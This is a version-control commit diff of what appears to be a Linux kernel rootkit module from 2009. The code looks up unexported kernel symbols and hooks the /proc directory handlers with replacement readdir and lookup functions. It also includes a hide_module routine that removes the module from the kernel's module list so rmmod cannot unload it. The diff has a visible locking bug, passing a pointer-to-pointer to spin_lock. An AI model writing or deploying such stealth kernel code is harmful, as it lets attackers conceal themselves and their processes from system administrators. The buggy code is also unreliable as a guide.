0e8690fbb7c220ae8f2280c1129e59b54727dae9
miguel.filipe <miguel.filipe@82fbb29e-e42b-11dd-b00f-9fabb4b2ff13>
2009-01-17 00:45:01 +0000

    b/Makefile |    2 +-  b/module.c |   43 ++++++++++++++++++++++++-------------------  b/module.h |    2 --  b/util.c   |   51 +++++++++++++++++++++------------------------------  main.h     |    2 --  5 files changed, 46 insertions(+), 54 deletions(-)

--- trunk/module.c
+++ trunk/module.c
@@ -14,6 +14,9 @@
 static struct nf_hook_ops nfho;
 struct module *me;
 
+spinlock_t	 *_proc_dir_spinlock;
+struct mutex     *_module_mutex;
+
 /* Backup of the previous handlers */ 
 struct file_operations proc_original_file_operations;
 struct inode_operations proc_original_inode_operations;
@@ -27,10 +30,16 @@ extern unsigned int hook_func (
 	const struct net_device *out, 
 	int (*okfn) (struct sk_buff *));
 
+/* Initializes our references to kernel symbols that are not exported. */
+void init_symbols(void)
+{
+	_proc_dir_spinlock = (spinlock_t *) my_sym_lookup("proc_subdir_lock");
+	_module_mutex = (struct mutex *) my_sym_lookup("module_mutex");
+}
+
 /* Initialisation routine */
 int init_module ()
 {
-	unsigned long address;
 	/* Fill in our hook structure */
 	nfho.hook = hook_func;
 
@@ -44,6 +53,10 @@ int init_module ()
 	// Safe pointer to us!
 	me = &__this_module;
 
+	init_symbols();
+
+	printk("Address of module_mutex: %p\n", _module_mutex);
+	printk("Address of proc_dir_spinlock: %p\n", _proc_dir_spinlock);
 
 	// Hide the module.
 	//hide_module();
@@ -53,20 +66,12 @@ int init_module ()
 	proc_original_inode_operations.lookup = proc_root.proc_iops->lookup;
 	
 	// New handlers. With a bit of magic because the compiler is stupid
-//	spin_lock(&proc_subdir_lock);
+	spin_lock(&_proc_dir_spinlock);
 
-//	((struct file_operations *)  ((void *)(proc_root.proc_fops)))->readdir = new_proc_readdir;
-//	((struct inode_operations *) ((void *)(proc_root.proc_iops)))->lookup = new_proc_lookup;
-	
-//	spin_unlock(&proc_subdir_lock);
-//
-	init_symbols();
-
-
-	address = my_sym_lookup("module_mutex");
-
-	printk("Address of module_mutex: %lu\n", address);
-	printk("Address of proc_subdir_lock: %lu\n", my_sym_lookup("proc_subdir_lock"));
+	((struct file_operations *)  ((void *)(proc_root.proc_fops)))->readdir = new_proc_readdir;
+	((struct inode_operations *) ((void *)(proc_root.proc_iops)))->lookup = new_proc_lookup;
+  
+	spin_unlock(&_proc_dir_spinlock);
 
 	return 0;
 }
@@ -79,23 +84,23 @@ void cleanup_module ()
 	nf_unregister_hook (&nfho);
 
 	// Restore proc fs handlers.
-//	spin_lock(&proc_subdir_lock);
+	spin_lock(&_proc_dir_spinlock);
 
 	((struct file_operations *)  ((void *)(proc_root.proc_fops)))->readdir = proc_original_file_operations.readdir;
 	((struct inode_operations *) ((void *)(proc_root.proc_iops)))->lookup = proc_original_inode_operations.lookup ;
 
-//	spin_unlock(&proc_subdir_lock);
+	spin_unlock(&_proc_dir_spinlock);
 
 }
 
 // Removes this module from the kernel modules list. rmmod would stop working for this module.
 void hide_module()
 {
-//	mutex_lock(&module_mutex);
+	mutex_lock(_module_mutex);
 
-        list_del(&(me->list));
+	list_del(&(me->list));
 
-//	mutex_unlock(&module_mutex);
+	mutex_unlock(_module_mutex);
 }
 
 
